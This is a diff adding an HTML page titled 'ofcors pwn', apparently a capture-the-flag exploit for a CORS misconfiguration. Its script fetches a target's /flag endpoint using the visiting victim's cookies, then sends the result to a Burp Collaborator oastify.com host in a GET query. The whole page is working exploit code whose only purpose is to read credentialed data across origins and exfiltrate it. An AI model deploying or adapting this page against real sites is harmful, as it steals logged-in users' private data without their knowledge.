@@ -1,0 +1,30 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>ofcors pwn</title>
+<body style="font-family:system-ui,Arial;margin:2rem">
+<h3>running...</h3>
+<pre id="out"></pre>
+<script>
+(async () => {
+  const out = id => (document.getElementById('out').textContent = id);
+  try {
+    // read Jenny origin from fragment or fallback
+    const frag = location.hash.slice(1);
+    const jOrigin = frag ? (new URL(frag)).origin : 'https://JENNY_HOST';
+    out('Target origin: ' + jOrigin);
+    // fetch /flag with cookies
+    const r = await fetch(`${jOrigin}/flag`, { credentials: 'include' });
+    if (!r.ok) throw new Error('fetch failed: ' + r.status);
+    const data = await r.json();
+    const flag = data.flag || JSON.stringify(data);
+    out('Flag: ' + flag);
+    // exfiltrate to Burp Collaborator (replace COLLAB_ID)
+    const collab = 'jsfv2avj26bdr1pokpqx7a7bp2vtjm7b.oastify.com';
+    // Use GET so Collaborator captures it reliably
+    await fetch(`https://${collab}/?f=${encodeURIComponent(flag)}`);
+    out('Exfiltrated to ' + collab);
+  } catch (e) {
+    out('Error: ' + e);
+  }
+})();
+</script>
